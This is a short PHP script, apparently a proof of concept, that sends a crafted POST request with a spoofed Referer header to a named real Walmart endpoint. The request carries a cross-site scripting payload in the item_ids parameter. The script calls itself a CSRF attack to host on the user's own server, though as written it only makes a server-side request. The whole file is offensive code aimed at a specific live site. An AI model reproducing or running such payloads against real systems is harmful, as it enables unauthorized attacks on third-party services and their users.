<?php
// csrf.php - Host this PHP script on your server

// Vulnerable endpoint provided
$target_url = "https://tap.walmart.com/v1/tapframe?department=Sports%20%26%20Outdoors&category=Bikes&subcategory=Bike%20Apparel%20%26%20Footwear&department_id=4125&category_id=1081404&subcategory_id=7258752&item_ids=%22(prompt(1))in%22&host=https%253A%252F%252Fwww.walmart.com%252Fsearch%253Fq%253Dxss";

// Simulate sending the Referer header
$referer = "https://www.walmart.com/ip/7iDP-M2-Helmet-Matt-Black-Gloss-Black-XSS-52-55cm/966359160?classType=REGULAR&from=/search";

// Prepare data for the POST request if needed (empty in this case)
$data = [];

// Build the query string from the data array
$postdata = http_build_query($data);

// Create an HTTP context with custom headers (including Referer)
$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n" .
                    "Referer: $referer\r\n", // Set the Referer header
        'method' => 'POST',
        'content' => $postdata,
    ]
];

// Create a stream context
$context = stream_context_create($options);

// Execute the request and send the CSRF payload to the vulnerable endpoint
$result = file_get_contents($target_url, false, $context);

// Output the result of the request for debugging purposes
echo $result;
?>
